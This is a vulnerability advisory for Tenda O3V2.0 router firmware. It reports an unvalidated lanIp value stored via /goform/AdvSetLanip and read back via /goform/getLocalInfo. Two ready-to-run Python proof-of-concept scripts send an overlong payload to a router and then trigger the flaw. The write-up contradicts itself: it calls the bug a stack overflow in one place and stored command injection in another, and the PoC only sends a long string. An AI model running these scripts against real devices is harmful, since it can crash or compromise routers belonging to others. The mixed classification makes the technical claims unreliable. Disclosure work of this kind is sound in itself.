## Summary

A stack overflow vulnerability exists in the Tenda O3V2.0 V1.0.0.10(2478) firmware. The `lanIp` POST parameter accepted by `/goform/AdvSetLanip` is written to the configuration key `lan.ip` via `SetValue` without length or content validation. The stored value is later read (via `/goform/getLocalInfo`) and stored on the stack. Since there is no limit on the length of the stored value, it can lead to stack overflow.

## Affected product & versions

- **Vendor:** Tenda
- **Product:** O3V2.0 (firmware)
- **Affected version:** V1.0.0.10(2478)
- **Download:** https://www.tenda.com.cn/download/detail-2832.html

## Vulnerability type

- **Type:** Command injection (persistent / stored)
- **Root cause:** Missing input validation / insufficient sanitization and lack of length checks in `SetValue` and `GetValue` functions that handle `lan.ip`.

## Technical details

- The `AdvSetLanip` endpoint accepts a POST parameter `lanIp` and calls `SetValue("lan.ip", v13)` without enforcing a maximum length or sanitizing shell metacharacters.
- Condition: For the program to execute this branch, the value of the POST parameter "lanType" must not be set to "Static".

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251011_100849.png)

- The `getLocalInfo` endpoint reads `lan.ip` via `GetValue("lan.ip", v6)` and passes it into a shell-invoking context (or a system call) without sanitization, making stored payloads executed when the endpoint is processed.
- ![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251011_101449.png)
- Both `SetValue` and `GetValue` lack proper validation of the value contents and length.

## Proof of Concept

1. **Store a malicious `lan.ip` value**

```python
# poc_set.py
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/AdvSetLanip"
payload = b"a"*1000

data = {"lanIp":payload,"lanType":"A"}
response = requests.post(url, data=data)
print(response.text)
```

2. **Trigger the vulnerable behavior**

```python
# poc_get.py
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/getLocalInfo"
response = requests.post(url)
print(response.text)
```

3. **Attack result**

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251011_104719.png)